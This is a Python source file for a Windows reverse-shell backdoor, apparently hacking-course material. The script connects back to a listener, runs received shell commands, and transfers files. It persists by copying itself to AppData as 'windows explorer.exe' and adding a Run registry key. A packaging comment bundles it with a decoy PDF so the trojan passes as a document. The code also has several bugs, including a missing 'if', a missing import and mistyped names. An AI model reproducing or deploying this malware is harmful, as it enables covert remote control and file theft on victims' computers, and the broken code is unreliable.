#!/usr/bin/env python
import socket
import subprocess
import json
import os
import base64
import sys


class Backdoor:
    def __init__(self,ip,port):
        self.become_persistent()
        self.connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.connection.connect((ip,port))
        #connection.send(b"\n[+] Connection initiated.\n")

    def become_persistent(self):
        evil_file_location = os.environ["appdata"] + "\\windows explorer.exe"
        os.path.exists(evil_file_location):
            shutil.copy(sys.executable, evil_file_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REZ_SZ /d "' + evil_file_location + '"', shell=True)

    def reliable_send(self, data):
        print(data)
        json_data = json.dumps(data.decode())
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data.decode())
            except ValueError:
                continue


    def execute_system_command(self,command):
        #return subprocess.check_output(command, shell=True)
        return subprocess.run(command, capture_output=True).stdout

    def change_working_directory_to(self, path):
        os.chdir(path)
        return b"[+] Changing working directory to " + path.encode()

    def write_file(self, path, content):
        with open(path,'wb') as file:
            file.write(base64.b64decode(content.encode()))
            return b"[+] Upload successful."

    def read_file(self, path):
        with open(path, 'rb') as file:
            return base64.b64encode(file.read())
    
    def run(self):
        while True:
            try:
                command = self.reliable_receive()
                if command[0] == 'exit':
                    self.connection.close()
                    sys.exit()
                elif command[0] == 'cd' and len(command)>1:
                    command_result = self.change_working_directory_to(command[1])
                elif command[0] == 'download':
                    command_result = self.read_file(command[1])
                elif command[0] == 'upload':
                    command_result = self.write_file(command[1],command[2])
                else:
                    print(command)
                    command_result = self.execute_system_command(command)
            except Exception:
                command_result = b"[-] Error occured during execution"
            self.reliable_send(command_result)
        
        self.connection.close()

# wine pyinstaller --add-data "/home/kali/Downloads/sample.pdf,." --onefile --noconsole reverse_backdoor.py
try:
    file_name = sys._MEIPASS + "\sample.pdf"
    subprocess.open(filename,shell=True)
except Exception:
    pass

try:
    my_backdoor = Backdoor("127.0.0.1", 4444)
    my_backdoor.run()
except Exception:
    sys.exit()
